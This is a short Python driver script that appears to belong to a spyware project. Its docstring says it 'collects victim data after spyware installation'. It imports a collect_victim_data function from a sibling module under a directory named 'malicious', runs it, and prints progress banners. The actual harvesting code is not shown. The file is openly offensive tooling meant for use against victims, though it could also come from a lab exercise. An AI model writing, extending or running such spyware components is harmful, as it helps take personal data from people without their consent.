"""
AUTO-RUN TECHNIQUE 1: DATA COLLECTION
Collects victim data after spyware installation

Usage: python main.py (from this directory)
"""

import sys
import os

# Add parent directories to path
current_dir = os.path.dirname(os.path.abspath(__file__))
auto_run_dir = os.path.dirname(current_dir)
malicious_dir = os.path.dirname(auto_run_dir)
sys.path.insert(0, malicious_dir)

from auto_run.technique1.function4_collect_data import collect_victim_data

def main():
    print("="*70)
    print("AUTO-RUN TECHNIQUE 1: DATA COLLECTION")
    print("="*70)
    print("\n[*] Collecting victim data...")
    
    victim_data = collect_victim_data()
    
    if victim_data:
        print(f"\n[✓] Data collection complete")
    print("="*70)

if __name__ == "__main__":
    main()
